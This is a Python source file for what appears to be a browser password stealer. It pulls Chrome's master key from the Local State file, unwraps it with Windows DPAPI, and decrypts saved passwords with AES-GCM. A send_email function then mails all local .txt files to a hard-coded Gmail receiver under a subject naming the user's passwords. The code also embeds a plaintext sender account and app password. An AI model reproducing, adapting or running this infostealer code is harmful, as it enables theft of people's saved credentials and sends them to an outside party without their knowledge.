import json
import base64
import win32crypt
from Cryptodome.Cipher import AES
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path
from datetime import datetime


def get_secret_key(PATH_LOCAL_STATE):
    with open(PATH_LOCAL_STATE, "rb") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        print(str(e))
        return "Chrome < 80"

def send_email(uname):
    date = datetime.now().strftime("%d/%m/%Y %H:%M")

    email_sender = "pythonva.sender@gmail.com"
    email_sender_password = "berkdzkqwtjqrqkz"
    email_receiver = "pythonva.receiver@gmail.com"

    smtp_port = 587
    smtp_server = "smtp.gmail.com"

    subject = f"{uname} passwords, {date}"

    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['Subject'] = subject

    files = Path(".").glob('*.txt')
    for file in files:
        with open(file, "rb") as f:
            attachment_pack = MIMEBase('application', 'octet-stream')
            attachment_pack.set_payload(f.read())
            encoders.encode_base64(attachment_pack)
            attachment_pack.add_header("Content-Disposition", "attachment; filename= " + str(file))
            msg.attach(attachment_pack)
    text = msg.as_string()

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(email_sender, email_sender_password)
    server.sendmail(email_sender, email_receiver, text)
    server.quit()